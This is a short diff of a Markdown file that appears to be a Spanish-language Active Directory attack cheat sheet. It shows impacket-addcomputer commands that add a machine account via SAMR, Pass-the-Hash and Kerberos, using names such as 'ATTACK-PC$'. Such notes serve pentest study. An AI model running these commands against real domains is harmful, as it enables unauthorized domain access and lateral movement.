@@ -25,11 +25,14 @@ impacket-addcomputer dominio.local/usuario_valido:Password123 -computer-name 'PR
 > Via SAMR
 
 </br>
+
 ```
 impacket-addcomputer dominio.local/usuario_valido -hashes :HASH_NT -computer-name 'PRUEBA-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC
 ```
 > Via Pass-the-Hash
+
 </br>
+
 ```
 impacket-addcomputer dominio.local/usuario_valido -k -no-pass -computer-name 'ATTACK-PC$' -computer-pass 'MaliciousPass123!' -dc-ip IP_DEL_DC
 ```
